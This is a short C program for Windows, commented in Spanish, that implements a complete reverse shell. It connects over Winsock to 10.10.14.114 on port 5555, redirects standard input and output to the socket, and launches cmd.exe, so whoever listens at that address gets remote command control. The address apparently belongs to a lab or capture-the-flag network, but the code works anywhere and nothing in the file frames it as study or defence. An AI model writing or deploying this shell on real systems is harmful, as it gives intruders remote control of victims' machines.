#include <winsock2.h>
#include <windows.h>

#pragma comment(lib,"ws2_32")

int main() {
    // Especifica la IP y el puerto a los que se conectará el reverse shell
    const char *server_ip = "10.10.14.114";
    int port = 5555;

    // Estructuras necesarias para manejar la conexión
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // Inicializa Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    // Crea el socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Configura la estructura del servidor
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(port);

    // Conecta al servidor
    if (WSAConnect(sock, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Redirige stdin, stdout y stderr al socket
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Ejecuta cmd.exe
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Espera a que el proceso termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Limpieza
    closesocket(sock);
    WSACleanup();

    return 0;
}
